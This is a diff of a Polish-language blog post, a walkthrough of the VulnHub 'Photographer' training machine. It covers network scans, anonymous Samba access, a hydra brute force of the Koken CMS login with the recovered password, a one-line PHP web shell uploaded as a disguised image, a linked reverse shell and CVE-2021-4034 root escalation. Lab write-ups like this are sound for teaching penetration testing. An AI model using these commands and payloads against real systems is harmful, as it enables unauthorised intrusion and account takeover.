@@ -101,8 +101,8 @@
   "keywords": [
     "Linux", "Easy"
   ],
-  "articleBody": "Jako pierwsze wykonałem standardowy skan swojej sieci.\n┌[parrot@parrot]─[~/Desktop] └╼[★ ]$sudo netdiscover -r 192.168.2.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 15 Captured ARP Req/Rep packets, from 4 hosts. Total size: 900 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.2.1 00:50:56:c0:00:08 12 720 VMware, Inc. 192.168.2.2 00:50:56:f0:ed:fa 1 60 VMware, Inc. 192.168.2.138 00:0c:29:d2:9a:78 1 60 VMware, Inc. 192.168.2.254 00:50:56:f8:70:fd 1 60 VMware, Inc. Teraz wiem, że IP maszyny to 192.168.2.138. Zatem przechodzę do właściwego pentestu.\n NMap ┌[parrot@parrot]─[~/Desktop] └╼[★ ]$nmap -sC -sV 192.168.2.138 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 03:09 CEST Nmap scan report for 192.168.2.138 Host is up (0.034s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Photographer by v1n1v131r4 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-trane-info: Problem with XML parsing of /evox/about |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-generator: Koken 0.22.24 |_http-title: daisa ahomi Service Info: Host: PHOTOGRAPHER Host script results: |_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: photographer | NetBIOS computer name: PHOTOGRAPHER\\x00 | Domain name: \\x00 | FQDN: photographer |_ System time: 2022-07-18T21:09:38-04:00 | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-07-19T01:09:38 |_ start_date: N/A |_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: , NetBIOS MAC:  (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default)  Strona główna  FeroxBuster Feroxbuster nie wykrył nic nadzwyczajnego.\n Strona na porcie 8000  Feroxbuster na stronie z portem 8000 Tutaj dostałem już ciekawszy output.\n┌[parrot@parrot]─[~/Desktop] └╼[★ ]$feroxbuster -w /usr/share/wordlists/dirb/common.txt -u http://192.168.2.138:8000 -t 50 -d 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.2.138:8000 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── WLD 0l 0w 0c Got 301 for http://192.168.2.138:8000/405f364f0ca84474bc832b2151e4cead (url length: 32) WLD - - - http://192.168.2.138:8000/405f364f0ca84474bc832b2151e4cead redirects to = /405f364f0ca84474bc832b2151e4cead/ 403 9l 28w 280c http://192.168.2.138:8000/.hta 403 9l 28w 280c http://192.168.2.138:8000/.htaccess 403 9l 28w 280c http://192.168.2.138:8000/.htpasswd 301 9l 28w 321c http://192.168.2.138:8000/admin 301 9l 28w 319c http://192.168.2.138:8000/app 200 96l 294w 4708c http://192.168.2.138:8000/index.php 403 9l 28w 280c http://192.168.2.138:8000/server-status 301 9l 28w 323c http://192.168.2.138:8000/storage [####################] - 4s 4613/4613 0s found:9 errors:0  [####################] - 3s 4614/4613 1187/s http://192.168.2.138:8000 /admin Na pozostałych /storage oraz /app dostaję 403 Forbidden co jest już troche dziwne.\n",
-  "wordCount" : "496",
+  "articleBody": "Jako pierwsze wykonałem standardowy skan swojej sieci.\n┌[parrot@parrot]─[~/Desktop] └╼[★ ]$sudo netdiscover -r 192.168.2.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 15 Captured ARP Req/Rep packets, from 4 hosts. Total size: 900 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.2.1 00:50:56:c0:00:08 12 720 VMware, Inc. 192.168.2.2 00:50:56:f0:ed:fa 1 60 VMware, Inc. 192.168.2.138 00:0c:29:d2:9a:78 1 60 VMware, Inc. 192.168.2.254 00:50:56:f8:70:fd 1 60 VMware, Inc. Teraz wiem, że IP maszyny to 192.168.2.138. Zatem przechodzę do właściwego pentestu.\n NMap ┌[parrot@parrot]─[~/Desktop] └╼[★ ]$nmap -sC -sV 192.168.2.138 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 03:09 CEST Nmap scan report for 192.168.2.138 Host is up (0.034s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Photographer by v1n1v131r4 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 8000/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-trane-info: Problem with XML parsing of /evox/about |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-generator: Koken 0.22.24 |_http-title: daisa ahomi Service Info: Host: PHOTOGRAPHER Host script results: |_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu) | Computer name: photographer | NetBIOS computer name: PHOTOGRAPHER\\x00 | Domain name: \\x00 | FQDN: photographer |_ System time: 2022-07-18T21:09:38-04:00 | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-07-19T01:09:38 |_ start_date: N/A |_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: , NetBIOS MAC:  (unknown) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default)  Strona główna  FeroxBuster Feroxbuster nie wykrył nic nadzwyczajnego.\n Strona na porcie 8000 Strona jest postawiona na CMS Koken 0.22.24. Widzę dokładną wersje dzięki addonowi do Mozilli o nazwie Wappalyzer.\n Searchsploit Nie możemy próbować z marszu, potrzebujemy być zalogowani jako dany użytkownik.\n Feroxbuster na stronie z portem 8000 Tutaj dostałem już ciekawszy output.\n┌[parrot@parrot]─[~/Desktop] └╼[★ ]$feroxbuster -w /usr/share/wordlists/dirb/common.txt -u http://192.168.2.138:8000 -t 50 -d 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.2.138:8000 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── WLD 0l 0w 0c Got 301 for http://192.168.2.138:8000/405f364f0ca84474bc832b2151e4cead (url length: 32) WLD - - - http://192.168.2.138:8000/405f364f0ca84474bc832b2151e4cead redirects to = /405f364f0ca84474bc832b2151e4cead/ 403 9l 28w 280c http://192.168.2.138:8000/.hta 403 9l 28w 280c http://192.168.2.138:8000/.htaccess 403 9l 28w 280c http://192.168.2.138:8000/.htpasswd 301 9l 28w 321c http://192.168.2.138:8000/admin 301 9l 28w 319c http://192.168.2.138:8000/app 200 96l 294w 4708c http://192.168.2.138:8000/index.php 403 9l 28w 280c http://192.168.2.138:8000/server-status 301 9l 28w 323c http://192.168.2.138:8000/storage [####################] - 4s 4613/4613 0s found:9 errors:0  [####################] - 3s 4614/4613 1187/s http://192.168.2.138:8000 /admin Na pozostałych /storage oraz /app dostaję 403 Forbidden co jest już troche dziwne.\n Samba ┌[parrot@parrot]─[~/vulnhub/photographer] └╼[★ ]$smbmap -H 192.168.2.138 -R --depth 10 [+] Guest session IP: 192.168.2.138:445 Name: 192.168.2.138 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers sambashare READ ONLY Samba on Ubuntu .\\sambashare\\* dr--r--r-- 0 Tue Jul 21 03:30:07 2020 . dr--r--r-- 0 Tue Jul 21 11:44:25 2020 .. fr--r--r-- 503 Tue Jul 21 03:29:39 2020 mailsent.txt fr--r--r-- 13930308 Tue Jul 21 03:22:23 2020 wordpress.bkp.zip IPC$ NO ACCESS IPC Service (photographer server (Samba, Ubuntu)) ┌[parrot@parrot]─[~/vulnhub/photographer] └╼[★ ]$smbclient //192.168.2.138/sambashare Enter WORKGROUP\\parrots password: Try \"help\" to get a list of possible commands. smb: \\ get mailsent.txt getting file \\mailsent.txt of size 503 as mailsent.txt (13,6 KiloBytes/sec) (average 13,6 KiloBytes/sec) smb: \\ get wordpress.bkp.zip getting file \\wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (12690,1 KiloBytes/sec) (average 12278,3 KiloBytes/sec) smb: \\ ls . D 0 Tue Jul 21 03:30:07 2020 .. D 0 Tue Jul 21 11:44:25 2020 mailsent.txt N 503 Tue Jul 21 03:29:40 2020 wordpress.bkp.zip N 13930308 Tue Jul 21 03:22:23 2020 278627392 blocks of size 1024. 264268400 blocks available smb: \\ exit mailsent.txt Message-ID:  Date: Mon, 20 Jul 2020 11:40:36 -0400 From: Agi Clarence  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0 X-Accept-Language: en-us, en MIME-Version: 1.0 To: Daisa Ahomi  Subject: To Do - Daisa Website's Content-Type: text/plain; charset=us-ascii; format=flowed Content-Transfer-Encoding: 7bit Hi Daisa! Your site is ready now. Don't forget your secret, my babygirl ;) Mamy zatem dwa maile, można spróbować przeprowadzić brute force tej strony z logowaniem z tymi mailami.\nagi@photographer.com daisa@photographer.com\nSprawdziłem na stronie formularz z logowaniem. Przypomnienie hasła daje wskazówkę, że takie maile istnieją. Poniżej output dla dowolnego maila i dowolnego hasła.\na poniżej dla obu powyższych maili.\nhydra ┌[parrot@parrot]─[~/vulnhub/photographer] └╼[★ ]$hydra -L emails.txt -P /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt 192.168.2.138 -s 8000 http-post-form \"/api.php?/sessions:email=^USER^\u0026password=^PASS^:F=Incorrect. Try again or reset your password.\" -I Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-19 18:07:00 [WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 20000 login tries (l:2/p:10000), ~1250 tries per task [DATA] attacking http-post-form://192.168.2.138:8000/api.php?/sessions:email=^USER^\u0026password=^PASS^:F=Incorrect. Try again or reset your password. [STATUS] 4269.00 tries/min, 4269 tries in 00:01h, 15731 to do in 00:04h, 16 active a[8000][http-post-form] host: 192.168.2.138 login: daisa@photographer.com password: babygirl 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-19 18:09:38 Jak się okazało hasłem było słowo babygirl użyte w mailu. Szczerze mówiąc nie przepadam za takim zgadywaniem. Dobrze, że są odpowiednie narzędzia do takich zadań.\ndaisa@photographer.com:babygirl\nUdało się zalogować, teraz wystarczy wykorzystać exploit.\nZgodnie z exploitem uploaduje plik image.php.png z kodem , a następnie potem należy zmienić nazwę pliku na image.php. Ja przeszedłem od razu do reverse shella z Githuba https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nPo uruchomieniu strony z kodem otrzymałem połączenie.\nuser.txt d41d8cd98f00b204e9800998ecf8427e\nlinpeas.sh - root LinPEAS wykrył, że box jest podatny na CVE-2021-4034.\nWykorzystałem fakt, że na boxie jest Python i wykonałem exploita poprzez Pythona, ponieważ standardowy sposób przez kompilację nie działał poprawnie.\nhttps://github.com/joeammond/CVE-2021-4034\nroot.txt root@photographer:/root# cat proof.txt .:/://::::///:-` -/++:+`:--:o: oo.-/+/:` -++-.`o++s-y:/s: `sh:hy`:-/+:` :o:``oyo/o`. ` ```/-so:+--+/` -o:-`yh//. `./ys/-.o/ ++.-ys/:/y- /s-:/+/:/o` o/ :yo-:hNN .MNs./+o--s` ++ soh-/mMMN--.` `.-/MMMd-o:+ -s .y /++:NMMMy-.`` ``-:hMMMmoss: +/ s- hMMMN` shyo+:. -/+syd+ :MMMMo h h `MMMMMy./MMMMMd: +mMMMMN--dMMMMd s. y `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm +- h dMMMMd:```` `mmNh ```./NMMMMs o. y. /MMMMNmmmmd/ `s-:o sdmmmmMMMMN. h` :o sMMMMMMMMs. -hMMMMMMMM/ :o s: `sMMMMMMMo - . `. . hMMMMMMN+ `y` `s- +mMMMMMNhd+h/+h+dhMMMMMMd: `s- `s: --.sNMMMMMMMMMMMMMMMMMMmo/. -s. /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o` .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o- ./+:`:yh:dso/.+-++++ss+h++.:++- -/+/-:-/y+/d:yh-o:+--/+/:` `-///////////////:` Follow me at: http://v1n1v131r4.com d41d8cd98f00b204e9800998ecf8427e Root proof ",
+  "wordCount" : "1124",
   "inLanguage": "en",
   "image":"https://suszczyk.github.io/thumbnails/Photographer.png","datePublished": "2022-07-19T00:00:00Z",
   "dateModified": "2022-07-19T00:00:00Z",
@@ -197,7 +197,7 @@
     <h1 class="post-title">
       Photographer
     </h1>
-    <div class="post-meta"><span title='2022-07-19 00:00:00 +0000 UTC'>July 19, 2022</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;Mateusz Suszczyk
+    <div class="post-meta"><span title='2022-07-19 00:00:00 +0000 UTC'>July 19, 2022</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Mateusz Suszczyk
 
 </div>
   </header> 
@@ -222,13 +222,30 @@
                     <a href="#strona-na-porcie-8000" aria-label="Strona na porcie 8000">Strona na porcie 8000</a><ul>
                         
                 <li>
+                    <a href="#searchsploit" aria-label="Searchsploit">Searchsploit</a></li>
+                <li>
                     <a href="#feroxbuster-na-stronie-z-portem-8000" aria-label="Feroxbuster na stronie z portem 8000">Feroxbuster na stronie z portem 8000</a><ul>
                         
                 <li>
-                    <a href="#admin" aria-label="/admin"><code>/admin</code></a>
+                    <a href="#admin" aria-label="/admin"><code>/admin</code></a></li></ul>
                 </li>
-            </ul>
-            </li>
+                <li>
+                    <a href="#samba" aria-label="Samba">Samba</a><ul>
+                        
+                <li>
+                    <a href="#mailsenttxt" aria-label="mailsent.txt"><code>mailsent.txt</code></a></li></ul>
+                </li>
+                <li>
+                    <a href="#hydra" aria-label="hydra">hydra</a></li>
+                <li>
+                    <a href="#usertxt" aria-label="user.txt">user.txt</a></li>
+                <li>
+                    <a href="#linpeassh---root" aria-label="linpeas.sh -&amp;gt; root">linpeas.sh -&gt; root</a></li>
+                <li>
+                    <a href="#roottxt" aria-label="root.txt">root.txt</a></li>
+                <li>
+                    <a href="#root-proof" aria-label="Root proof">Root proof</a>
+                </li>
             </ul>
             </li>
             </ul>
@@ -304,6 +321,14 @@ Host script results:
 <h1 id="strona-na-porcie-8000">Strona na porcie 8000<a hidden class="anchor" aria-hidden="true" href="#strona-na-porcie-8000">#</a></h1>
 <p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719031501.png" alt=""  />
 </p>
+<p>Strona jest postawiona na CMS <code>Koken 0.22.24</code>. Widzę dokładną wersje dzięki addonowi do Mozilli o nazwie <code>Wappalyzer</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719182230.png" alt=""  />
+</p>
+<hr>
+<h2 id="searchsploit">Searchsploit<a hidden class="anchor" aria-hidden="true" href="#searchsploit">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719182002.png" alt=""  />
+</p>
+<p>Nie możemy próbować z marszu, potrzebujemy być zalogowani jako dany użytkownik.</p>
 <hr>
 <h2 id="feroxbuster-na-stronie-z-portem-8000">Feroxbuster na stronie z portem 8000<a hidden class="anchor" aria-hidden="true" href="#feroxbuster-na-stronie-z-portem-8000">#</a></h2>
 <p>Tutaj dostałem już ciekawszy output.</p>
@@ -343,6 +368,130 @@ WLD         -         -         - http://192.168.2.138:8000/405f364f0ca84474bc83
 <p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719031826.png" alt=""  />
 </p>
 <p>Na pozostałych <code>/storage</code> oraz <code>/app</code> dostaję <code>403 Forbidden</code> co jest już troche dziwne.</p>
+<hr>
+<h2 id="samba">Samba<a hidden class="anchor" aria-hidden="true" href="#samba">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/photographer<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$smbmap -H 192.168.2.138 -R --depth <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Guest session       IP: 192.168.2.138:445   Name: 192.168.2.138                                     
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        sambashare                                              READ ONLY       Samba on Ubuntu
+        .<span style="color:#ae81ff">\s</span>ambashare<span style="color:#ae81ff">\*</span>
+        dr--r--r--                <span style="color:#ae81ff">0</span> Tue Jul <span style="color:#ae81ff">21</span> 03:30:07 <span style="color:#ae81ff">2020</span>    .
+        dr--r--r--                <span style="color:#ae81ff">0</span> Tue Jul <span style="color:#ae81ff">21</span> 11:44:25 <span style="color:#ae81ff">2020</span>    ..
+        fr--r--r--              <span style="color:#ae81ff">503</span> Tue Jul <span style="color:#ae81ff">21</span> 03:29:39 <span style="color:#ae81ff">2020</span>    mailsent.txt
+        fr--r--r--         <span style="color:#ae81ff">13930308</span> Tue Jul <span style="color:#ae81ff">21</span> 03:22:23 <span style="color:#ae81ff">2020</span>    wordpress.bkp.zip
+        IPC$                                                    NO ACCESS       IPC Service <span style="color:#f92672">(</span>photographer server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/photographer<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$smbclient //192.168.2.138/sambashare
+Enter WORKGROUP<span style="color:#ae81ff">\p</span>arrots password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> get mailsent.txt
+getting file <span style="color:#ae81ff">\m</span>ailsent.txt of size <span style="color:#ae81ff">503</span> as mailsent.txt <span style="color:#f92672">(</span>13,6 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 13,6 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> get wordpress.bkp.zip
+getting file <span style="color:#ae81ff">\w</span>ordpress.bkp.zip of size <span style="color:#ae81ff">13930308</span> as wordpress.bkp.zip <span style="color:#f92672">(</span>12690,1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 12278,3 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> ls
+  .                                   D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">21</span> 03:30:07 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Jul <span style="color:#ae81ff">21</span> 11:44:25 <span style="color:#ae81ff">2020</span>
+  mailsent.txt                        N      <span style="color:#ae81ff">503</span>  Tue Jul <span style="color:#ae81ff">21</span> 03:29:40 <span style="color:#ae81ff">2020</span>
+  wordpress.bkp.zip                   N <span style="color:#ae81ff">13930308</span>  Tue Jul <span style="color:#ae81ff">21</span> 03:22:23 <span style="color:#ae81ff">2020</span>
+
+                <span style="color:#ae81ff">278627392</span> blocks of size 1024. <span style="color:#ae81ff">264268400</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> exit
+</code></pre></div><h3 id="mailsenttxt"><code>mailsent.txt</code><a hidden class="anchor" aria-hidden="true" href="#mailsenttxt">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
+Date: Mon, 20 Jul 2020 11:40:36 -0400
+From: Agi Clarence &lt;agi@photographer.com&gt;
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
+X-Accept-Language: en-us, en
+MIME-Version: 1.0
+To: Daisa Ahomi &lt;daisa@photographer.com&gt;
+Subject: To Do - Daisa Website&#39;s
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Transfer-Encoding: 7bit
+
+Hi Daisa!
+Your site is ready now.
+Don&#39;t forget your secret, my babygirl ;)
+</code></pre></div><p>Mamy zatem dwa maile, można spróbować przeprowadzić brute force tej strony z logowaniem z tymi mailami.</p>
+<p><code>agi@photographer.com</code>
+<code>daisa@photographer.com</code></p>
+<p>Sprawdziłem na stronie formularz z logowaniem. Przypomnienie hasła daje wskazówkę, że takie maile istnieją. Poniżej output dla dowolnego maila i dowolnego hasła.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719160859.png" alt=""  />
+</p>
+<p>a poniżej dla obu powyższych maili.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719160925.png" alt=""  />
+</p>
+<h2 id="hydra">hydra<a hidden class="anchor" aria-hidden="true" href="#hydra">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/photographer<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$hydra -L emails.txt -P /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt 192.168.2.138 -s <span style="color:#ae81ff">8000</span> http-post-form <span style="color:#e6db74">&#34;/api.php?/sessions:email=^USER^&amp;password=^PASS^:F=Incorrect. Try again or reset your password.&#34;</span> -I      
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2022-07-19 18:07:00
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>ignored ...<span style="color:#f92672">)</span> from a previous session found, to prevent overwriting, ./hydra.restore
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">20000</span> login tries <span style="color:#f92672">(</span>l:2/p:10000<span style="color:#f92672">)</span>, ~1250 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://192.168.2.138:8000/api.php?/sessions:email<span style="color:#f92672">=</span>^USER^&amp;password<span style="color:#f92672">=</span>^PASS^:F<span style="color:#f92672">=</span>Incorrect. Try again or reset your password.
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 4269.00 tries/min, <span style="color:#ae81ff">4269</span> tries in 00:01h, <span style="color:#ae81ff">15731</span> to <span style="color:#66d9ef">do</span> in 00:04h, <span style="color:#ae81ff">16</span> active
+a<span style="color:#f92672">[</span>8000<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 192.168.2.138   login: daisa@photographer.com   password: babygirl
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2022-07-19 18:09:38
+</code></pre></div><p>Jak się okazało hasłem było słowo <code>babygirl</code> użyte w mailu. Szczerze mówiąc nie przepadam za takim zgadywaniem. Dobrze, że są odpowiednie narzędzia do takich zadań.</p>
+<p><code>daisa@photographer.com:babygirl</code></p>
+<p>Udało się zalogować, teraz wystarczy wykorzystać exploit.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719182438.png" alt=""  />
+</p>
+<p>Zgodnie z exploitem uploaduje plik <code>image.php.png</code> z kodem <code>&lt;?php system($_GET['cmd']);?&gt;</code>, a następnie potem należy zmienić nazwę pliku na <code>image.php</code>. Ja przeszedłem od razu do reverse shella z Githuba <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
+<p>Po uruchomieniu strony z kodem otrzymałem połączenie.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719183402.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719183347.png" alt=""  />
+</p>
+<h2 id="usertxt">user.txt<a hidden class="anchor" aria-hidden="true" href="#usertxt">#</a></h2>
+<p><code>d41d8cd98f00b204e9800998ecf8427e</code></p>
+<h2 id="linpeassh---root">linpeas.sh -&gt; root<a hidden class="anchor" aria-hidden="true" href="#linpeassh---root">#</a></h2>
+<p>LinPEAS wykrył, że box jest podatny na <code>CVE-2021-4034</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719184143.png" alt=""  />
+</p>
+<p>Wykorzystałem fakt, że na boxie jest Python i wykonałem exploita poprzez Pythona, ponieważ standardowy sposób przez kompilację nie działał poprawnie.</p>
+<p><a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a></p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220719213728.png" alt=""  />
+</p>
+<h2 id="roottxt">root.txt<a hidden class="anchor" aria-hidden="true" href="#roottxt">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">root@photographer:/root# cat proof.txt
+                                                                   
+                                .:/://::::///:-`                                
+                            -/++:+`:--:o:  oo.-/+/:`                            
+                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         
+                       :o:``oyo/o`. `      ```/-so:+--+/`                       
+                     -o:-`yh//.                 `./ys/-.o/                      
+                    ++.-ys/:/y-                  /s-:/+/:/o`                    
+                   o/ :yo-:hNN                   .MNs./+o--s`                   
+                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   
+                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  
+                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  
+                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 
+                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 
+                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 
+                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 
+                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  
